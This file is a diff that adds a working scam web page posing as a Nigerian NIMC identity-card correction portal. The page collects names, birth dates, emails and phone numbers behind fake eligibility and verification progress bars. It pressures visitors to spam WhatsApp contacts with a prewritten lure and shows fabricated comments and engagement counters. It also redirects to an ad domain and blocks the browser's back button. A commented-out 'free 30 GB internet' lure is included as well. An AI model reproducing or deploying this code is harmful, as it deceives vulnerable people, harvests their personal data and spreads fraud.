@@ -1,0 +1,812 @@
+
+
+<!DOCTYPE html>
+<html>
+    <head>
+    <script>
+
+        function set_Cookie(name,value){
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + (Days*20*1000));
+            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
+        }
+        function get_Cookie(name){
+            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+            if(arr=document.cookie.match(reg)){
+                return unescape(arr[2]);
+            }
+            return '';
+        }
+
+
+        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
+                        document.getElementById("first-box")."quedate__step".display="none";//??;
+                        document.getElementById("second-box").style.display="none";//??;
+                        document.getElementById("third-box").style.display="none";//??;
+                        document.getElementsByClassName("loading2__box").style.display="";//??;
+                    }*/
+
+
+    </script>
+  
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Apply for ₦25,000 cash transfer to 15M household for 3 month</title>
+        <link rel="shortcut icon" type="image/png" href="President-Bola-Tinubu-has-signs-the-Students-Loan-Bill-into-law.png" />
+        <meta name="og:title" content="Apply for ₦25,000 cash transfer to 15M household for 3month" />
+        <meta name="og:url" content="Workpo.com/cash-transfer/" />
+        <meta property="og:description" content="Apply for ₦25,000 cash transfer to 15M household for 3 month" />
+        <meta property="og:image" content="President-Bola-Tinubu-has-signs-the-Students-Loan-Bill-into-law.png" />
+        <meta property="og:type" content="website" />
+    <meta property="og:updated_time" content="1440432930" />
+    <link rel="me" href="https://www.blogger.com/profile/13809910274301822692" />
+
+<link rel="me" href="https://www.blogger.com/profile/17222055979768522082" />
+<link rel="me" href="https://www.blogger.com/profile/00799001298388224124" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/00799001298388224124" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/14229601237220155934" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<body>
+<style type="text/css">
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
+@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
+* {
+    margin: 0;
+    padding: 0;
+    font-family: Poppins, Droid Arabic Naskh;
+    font-weight: normal;
+    box-sizing: border-box;
+
+
+}
+body {
+    direction: lfl;
+    background: #ebedf0;
+}
+a {
+    text-decoration: none;
+}
+.post {
+    background: #fff;
+    margin: 0 auto;
+    padding: 10px;
+    max-width: 500px;
+    border: 1px solid #d0d1d5;
+    border-radius: 3px;
+}
+.post img {
+    width: 100%;
+}
+.welcome {
+    font-size: 15px;
+}
+.amount,
+#getname {
+    color: #098105;
+    text-decoration: none;
+}
+.done {
+    text-align: center;
+    color: #27ae60;
+}
+.tip {
+    font-size: 14px;
+}
+.title {
+    text-align: center;
+}
+.error {
+    display: none;
+    text-align: center;
+    font-size: 14px;
+    color: #e74c3c;
+}
+button {
+    display: block;
+    width: 200px;
+    height: 50px;
+    color: #fff;
+    border: none;
+    outline: none;
+    font-size: 24px;
+    cursor: pointer;
+    border-radius: 5px;
+    padding: 0 10px;
+    margin: 10px auto;
+    background: rgb(9, 129, 5);
+    transition: background 0.3s ease;
+}
+button:hover {
+    background: #098105;
+}
+.phone {
+    max-width: 400px;
+    margin: 10px auto;
+}
+.phone input {
+    width: 100%;
+    height: 50px;
+    padding: 10px;
+    outline: none;
+    border: 2px solid #cecece;
+    font-size: 14px;
+}
+#confirm {
+    width: 200px;
+    margin: 10px auto;
+    border-radius: 0px;
+}
+#loader {
+    text-align: center;
+}
+.spin {
+    width: 50px;
+    height: 50px;
+    background: transparent;
+    border: solid 8px rgb(9, 129, 5);
+    border-right-color: transparent;
+    border-radius: 50%;
+    margin: 10px auto;
+    animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+    100% {
+        transform: rotate(1turn);
+    }
+}
+#loader,
+#info,
+#checking,
+#share,
+#claim {
+    display: none;
+}
+.center {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.barr {
+    direction: ltr;
+    max-width: 400px;
+    margin: 10px auto;
+    box-sizing: border-box;
+}
+.fill {
+    position: relative;
+    display: inline-block;
+    width: calc(100% - 100px);
+    height: 35px;
+    padding: 2px;
+    border: 2px solid #098105;
+}
+#fill,
+#fill2 {
+    background: #098105;
+    width: 0%;
+    height: 100%;
+}
+.percentage {
+    width: 100px;
+    float: right;
+    height: 35px;
+    font-size: 16px;
+    border: 2px solid #098105;
+}
+#percentage,
+#percentage2 {
+    margin-left: 5px;
+}
+#check,
+#check2 {
+    display: none;
+}
+.counter {
+    color: #7f7f7f;
+    font-size: 12px;
+    text-align: right;
+    padding: 10px 0 10px 2px;
+    border-bottom: 1px solid #e1e2e3;
+}
+.reactions {
+    display: inline-flex;
+    align-items: center;
+    float: left;
+}
+.counter img {
+    float: left;
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    border: 2px solid #fff;
+    box-sizing: content-box;
+}
+.like,
+.love {
+    margin-right: -5px;
+}
+.like {
+    z-index: 2;
+}
+.love {
+    z-index: 1;
+}
+.bar {
+    display: table;
+    width: 100%;
+    border-bottom: 1px solid #e1e2e3;
+}
+.bar .react {
+    display: table-cell;
+    width: calc(100% / 3);
+    font-size: 12px;
+    color: #7f7f7f;
+    text-align: center;
+    padding: 10px 0;
+    cursor: pointer;
+}
+.comments {
+    direction: ltr;
+}
+.comment {
+    padding: 6px 0;
+    margin-top: 5px;
+}
+.comment img {
+    float: left;
+    width: 32px;
+    height: 32px;
+    border: none;
+    border-radius: 18px;
+    cursor: pointer;
+}
+.reply {
+    margin-left: 37px;
+}
+.single-container {
+    margin-left: 37px;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    font-size: 12px;
+}
+.single-container .user {
+    display: inline-block;
+    cursor: pointer;
+    color: #365899;
+    margin-bottom: 5px;
+}
+.single-container .text {
+    display: block;
+}
+.buttons {
+    font-size: 12px;
+    font-weight: bold;
+    margin: 10px 0 0 47px;
+    color: #90949c;
+}
+.action {
+    cursor: pointer;
+}
+.action:hover {
+    text-decoration: underline;
+}
+.input {
+    padding: 6px 12px 12px;
+}
+.input input {
+    width: 100%;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    border: 0;
+    outline: none;
+}
+.A{
+    text-align: center;
+    background-color: rgb(151, 199, 149);
+}
+</style>
+  
+  
+  
+  
+                    <center><img src="https://imagizer.imageshack.com/img923/680/c9lOZZ.jpg" alt="ASIWAJU" style="width: 100%;"></center>
+                       <marquee class="horizontal_marque" direction="left">NIMC MODIFICATION/CORRECTION PORTAL 2024</marquee> <div class="A">
+  </b><b><p>Nimc</p>
+           <script type="text/javascript">
+                     var timeleft = 15348;
+                     var downloadTimer = setInterval(function(){
+                         timeleft= timeleft + Math.floor(Math.random() * 600);
+                         document.getElementById('countdowntimer').textContent = timeleft;
+                         if (timeleft <= 0)
+                             clearInterval(downloadTimer);
+                     }, 1000);
+                 </script>
+         </div>
+    <div class="post" width="100%">
+
+        <div id="intro">
+         
+            <p class="welcome">
+
+               Your Request has been received. Click on <span class="amount">CHECK </span> below to confirm if you are eligible to make modification/correction<br> <span class="amount">Note!</span> The Number Of Applicants is limited, so act fast<br>
+                 
+                </p>
+          
+               
+            <button id="go">CHECK ➤</button>
+        </div>
+        <div id="loader">
+            <div> Checking Eligibility...</div>
+            <div class="spin"></div>
+            <div id="num">0%</div>
+        </div>
+        <div id="info">
+          <p class="title"> <font color="red">NOTE: MODIFICATION/CORRECTION IS FREE</font></p>
+             <br>
+            <center><p><b><h4><font color="green">PLEASE FILL OUT THE FORM CORRECTLY THE EXACT WAY YOU WANT IT TO APPEAR AND UPDATED ON YOUR NIMC CARD</font></h4></b></p></center>
+            <div class="phone">
+              <br>
+              <label style="text-align:left"> 
+              <p><b><font color="green">Full Name</font></b></p>
+                <center><input type="char" placeholder="Enter Your Full Name" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center>
+              
+              
+             <br>
+                <label style="text-align:left">    
+                  <p><b><font color="green">Gender</font></b></p>
+      <select style="width: auto;">
+                <option>----------------Select Gender------------</option>
+                   <option value="Airtel">Male</option>
+                   <option value="mtn">Female</option></select>
+              
+                  
+                  
+                  <br>
+                  <br>
+        <label style="text-align:left">    
+      <p><b><font color="green">Date Of Birth</font></b></p>
+     <select style="width: auto;">
+       
+  
+
+
+        <option value="0">-Day-</option>
+        <option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option><option value="7">7</option><option value="8">8</option><option value="9">9</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option></select>
+              
+           <select style="width: auto;">
+       
+  
+-----------------
+
+             <center><option value="0">Month</option></center>
+        <option value="1">January</option><option value="2">February</option><option value="3">March</option><option value="4">April</option><option value="5">May</option><option value="6">June</option><option value="7">July</option><option value="8">August</option><option value="9">September</option><option value="10">October</option><option value="11">November</option><option value="12">December</option></select>
+              
+            <select style="width: auto;">
+       
+  
+
+
+        <option value="0">-Year-</option>
+        <option value="2005">2005</option><option value="2004">2004</option><option value="2003">2003</option><option value="2002">2002</option><option value="2001">2001</option><option value="2000">2000</option><option value="1999">1999</option><option value="1998">1998</option><option value="1997">1997</option><option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option
+value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option></select>
+              
+                   
+          <br>
+          <br>
+                    <label style="text-align:left">    
+                     <p><b><font color="green">Email</font></b></p>
+                <input type="text" name="email" placeholder="E-mail Address">
+                     
+                      
+                      
+                      <br>
+                      <br>
+                     <label style="text-align:left">    
+                       <p><b><font color="green">Phone Number</font></b></p>
+                <input type="text" name="phone" placeholder="Phone Number">
+                       
+                       
+                       
+                       <br>
+                       <br>
+                       <label style="text-align:left">    
+                         <p><b><font color="green">State</font></b></p>
+                <select style="width: auto;">
+                    <option>-----------------Select State-------------</option>
+                   <option
+value="Airtel">Abia</option>
+             <option value="mtn">Adamawa</option>
+    <option value="mtn">Akwa Ibom</option>
+             <option value="mtn">Anambra</option>
+             <option value="mtn">Bauchi</option>
+             <option value="mtn">Bayelsa</option>
+             <option value="mtn">Benue</option>
+             <option value="mtn">Borno</option>
+             <option value="mtn">Cross River</option>
+             <option value="mtn">Delta</option>
+             <option value="mtn">Ebonyi</option>
+             <option value="mtn">Edo</option>
+             <option value="mtn">Ekiti</option>
+             <option value="mtn">Enugu</option>
+             <option value="mtn">Gombe</option>
+             <option value="mtn">Imo</option>
+             <option value="mtn">Jigawa</option>
+             <option value="mtn">Kaduna</option>
+             <option value="mtn">Kano</option>
+             <option value="mtn">Katsina</option>
+             <option value="mtn">Kebbi</option>
+             <option value="mtn">Kogi</option>
+             <option value="mtn">Kwara</option>
+             <option value="mtn">Lagos</option>
+             <option value="mtn">Nasarawa</option>
+             <option value="mtn">Niger</option>
+             <option value="mtn">Ogun</option>
+             <option value="mtn">Ondo</option>
+             <option value="mtn">Osun</option>
+             <option value="mtn">Oyo</option>
+             <option value="mtn">Plateau</option>
+             <option value="mtn">Rivers</option>
+             <option value="mtn">Sokoto</option>
+             <option value="mtn">Taraba</option>
+             <option value="mtn">Yobe</option>
+             <option value="mtn">Zamfara</option>
+             <option value="MTN">FCT - Abuja</option>
+                </select>
+<br>
+                         <br>
+              
+                <button id="confirm">PROCEED HERE</button>
+            </div>
+            <p class="error">Please Fill The Form Correctly!!!</p>
+        </div>
+        <div id="checking">
+            <p class="title">Verifying your details...</p>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill"></div>
+                </div>
+                <div class="percentage center">
+                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="check"><i class="fa fa-check-circle"></i></span>
+                    <span id="percentage"></span>
+                </div>
+            </div>
+        </div>
+        <div id="share">
+
+            <p class="tip"> Congratulations, <span id="getname"></span>.</p>
+            <p class="tip">
+             After checking, you're eligible to make your corrections. <font color="green">(Approved)</font><br><br><span class="amount"> <center>How to proceed: </center></span>  
+            </p><br>
+            <p class="tip">1. Click the "SHARE" button to share this information with 15 friends or 5 groups on WhatsApp so that others will be aware of this so they won't fall into the hands of scammers who promise to help them make corrections but end up asking for their private details such as bank pins etc.</p>
+            <p class="tip">2. Then click "DONE" after the GREEN verification bar is filled.</p>
+            <p class="tip">3. You will receive a confirmation SMS within 15 minutes confirming when your corrections will be ready and updated to your new Nimc Card</p>
+          <br>
+
+
+            <button id="whatsapp">SHARE NOW</button>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill2"></div>
+                </div>
+                <div class="percentage center">
+                    <span><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="percentage2">0%</span>
+                </div>
+            </div>
+        </div>
+        <div id="claim">
+            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
+            <p class="title"> Congratulations, Your correction is successful and you will receive a confirmation SMS after clicking on VALIDATE. </p>
+            <button id="offer">DONE</button>
+          <br>
+          <center>         
+<a  onclick="window.open('//thefacux.com/4/6279230')" href="//thefacux.com/4/6279230" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="button final">SPEAK TO US</button></a> 
+    </center><br/>
+          
+          <center>         
+<a  onclick="window.open('//thefacux.com/4/6279230')" href="//thefacux.com/4/6279230" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="button final">YOUR CARD IS AVAILABLE</button></a> 
+    </center><br/>
+          
+           </div>
+        <div class="comments">
+            <div class="counter">
+                <div class="reactions">
+                    <img class="like" src="https://i.imgur.com/g6cV61A.png" /> <img class="love" src="https://i.imgur.com/0UHB1f0.png" /> <img class="care" src="https://i.imgur.com/sSMYbTT.png" /> <span id="likes">134K</span>
+                </div>
+                <span id="comments">23K comments</span> <span class="dot">·</span> <span id="shares">12K shares</span>
+            </div>
+            <div class="bar">
+                <span class="react"><i class="fa fa-thumbs-o-up"></i> <a class="liked">Like</a></span> <span class="react"><i class="fa fa-comment-o"></i> Comment</span> <span class="react"><i class="fa fa-share"></i> Share</span>
+            </div>
+            <div>
+                <div class="comment">
+                    </div>
+                </div>
+                <div class="comment">
+                    <img src="https://i.imgur.com/xp1ER6K.jpg" />
+                    <div class="single-container">
+                        <span class="user"> Kashim Isah</span>
+                        <span class="text">
+It was not even up to 15 minutes when I received an Sms, God bless Nimc... 
+                        </span>
+                    </div>
+                    <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="comment">
+                    <img src="https://i.imgur.com/iuLQxh6.png" />
+                    <div class="single-container"><span class="user">James Idowu </span> <span class="text"> I never thought i will be eligible but now I'm very happy. 😍</span></div>
+                    <div class="buttons"><span class="time t2">2m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="comment reply">
+                    <img src="https://i.imgur.com/KTvWL6j.jpg" />
+                    <div class="single-container"><span class="user"> Abubakar Umar </span> <span class="text">I am disappointed it took more than 15 minutes to get confirmation Sms and email. But I'm still happy at least it came</span></div>
+                    <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="comment">
+                    <img src="https://i.imgur.com/D3BlBjV.jpg" />
+                    <div class="single-container"><span class="user"> Alao Rukayat </span> <span class="text">Just follow the instructions and you will get it straight...just got mine</span></div>
+                    <div class="buttons"><span class="time t3">4m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="input"><input placeholder="Write a comment..." /></div>
+            </div>
+        </div>
+    </div>
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+
+
+
+
+<script type="text/javascript">
+var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+    }
+});
+</script>
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+
+$("#go").click(function () {
+    $("#intro").fadeOut(0);
+    $("#loader").fadeIn(1000);
+    var i = 0;
+    var interval = setInterval(function () {
+        $("#num").text(i + "%");
+        i += 1;
+        if (i >= 100) {
+            clearInterval(interval);
+            $("#loader").fadeOut(0);
+            $("#info").fadeIn(1000);
+        }
+    }, 50);
+});
+$("#confirm").click(function () {
+    if ($("#name").val().length < 4)
+    {
+        $(".error").fadeIn(500);
+    } else {
+        $("#info").fadeOut(0);
+        $("#checking").fadeIn(1000);
+        var i = 0;
+        var interval = setInterval(function () {
+            i += 1;
+            $("#percentage").text(i + "%");
+            $("#fill").css("width", i + "%");
+            if (i == 50) {
+                i = 49;
+                setTimeout(function () {
+                    i = 50;
+                }, 1000);
+            }
+            if (i >= 100) {
+                clearInterval(interval);
+                $("#load").fadeOut(0);
+                $("#check").fadeIn(0);
+                setTimeout(function () {
+                    $("#checking").fadeOut(0);
+                    $("#share").fadeIn(1000);
+                    $("#getname").html($("#name").val());
+                }, 500);
+            }
+        }, 50);
+    }
+});
+$(document).click(function () {
+    if ($("#name").is(":focus")) {
+        $(".error").fadeOut(500);
+    }
+});
+</script>
+
+
+
+
+<!--
+"*30%20GB%20Free%20Internet%20Offer*%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20Airtel*%0Ahttps://cutt.ly/30-GB_Airtel%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://lyupz.com/ccHXq
+-->
+    <script>
+        var text1 = "*NIMC CORRECTION PORTAL IS OPEN*%0A%0ADue to high level of complain, the Federal Government have urge NIMC to open up their *CORRECTION PORTAL* and attend to the complaints of *bonafide citizens of Nigeria* and Correction is FREE %0A%0A*Choose the correction you want to make*%0A%0A*NAME CORRECTION*%0A*https://tr.ee/Nimc-Portal-For-Correction*%0A%0A*DATE OF BIRTH CORRECTION*%0A*https://tr.ee/Nimc-Portal-For-Correction*%0A%0A*GENDER CORRECTION*%0A*https://tr.ee/Nimc-Portal-For-Correction*%0A%0A*OTHERS*%0A*https://tr.ee/Nimc-Portal-For-Correction*",
+        
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "//thefacux.com/4/6279230",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+    </script>
+
+
+
+
+
+
+<script type="text/javascript">
+ var swidth = localStorage.getItem(saved);
+if (swidth !== null) {
+    var width = swidth * 1;
+    $("#intro").fadeOut(0);
+    $(".comments").fadeOut(0);
+    $("#share").fadeIn(0);
+    $("#fill2").css("width", width + "%");
+    $("#percentage2").text(width + "%");
+} else {
+    var width = 0;
+}
+$("#whatsapp").click(function () {
+    window.location.href = share;
+    if (width == 0) {
+        width += 50;
+    } else if (width == 50) {
+        alert(error);
+        width += 15;
+    } else if (width == 65) {
+        width += 5;
+    } else if (width == 70) {
+        alert(error);
+        width += 10;
+    } else if (width == 80) {
+        alert(error);
+        width += 5;
+    } else if (width == 85) {
+        width += 2;
+    } else if (width == 87) {
+        width += 1;
+    } else if (width == 88) {
+        width += 2;
+    } else if (width == 90) {
+        width += 1;
+    } else if (width == 91) {
+        width += 1;
+    } else if (width == 92) {
+        width += 1;
+    } else if (width == 93) {
+        width += 1;
+    } else if (width == 94) {
+        width += 1;
+    } else if (width == 95) {
+        width += 1;
+    } else if (width == 96) {
+        width += 2;
+    } else {
+        $("#share").fadeOut(0);
+        $("#claim").fadeIn(1000);
+    }
+    localStorage.setItem(saved, width);
+    setTimeout(function () {
+        $("#fill2").css("width", width + "%");
+        $("#percentage2").text(width + "%");
+    }, 2000);
+});
+$("#offer").click(function () {
+    window.open(abcde, "_blank");
+});
+</script>
+
+
+<script>
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="//thefacux.com/4/6279230";
+    }
+    function goon(){
+        location.href="//thefacux.com/4/6279230";
+    }
+</script>
+
+<script>
+(function (global) {
+
+    if(typeof (global) === "undefined")
+    {
+        throw new Error("window is undefined");
+    }
+
+    var _hash = "!";
+    var noBackPlease = function () {
+        global.location.href += "#";
+
+        // making sure we have the fruit available for juice....
+        // 50 milliseconds for just once do not cost much (^__^)
+        global.setTimeout(function () {
+            global.location.href += "!";
+        }, 50);
+    };
+    
+    // Earlier we had setInerval here....
+    global.onhashchange = function () {
+        if (global.location.hash !== _hash) {
+            global.location.hash = _hash;
+        }
+    };
+
+    global.onload = function () {
+        
+        noBackPlease();
+
+        // disables backspace on page except on input fields and textarea..
+        document.body.onkeydown = function (e) {
+            var elm = e.target.nodeName.toLowerCase();
+            if (e.which === 8 && (elm !== 'input' && elm  !== 'textarea')) {
+                e.preventDefault();
+            }
+            // stopping event bubbling up the DOM tree..
+            e.stopPropagation();
+        };
+        
+    };
+
+})(window);
+</script>
+
+
+
+</body></html>
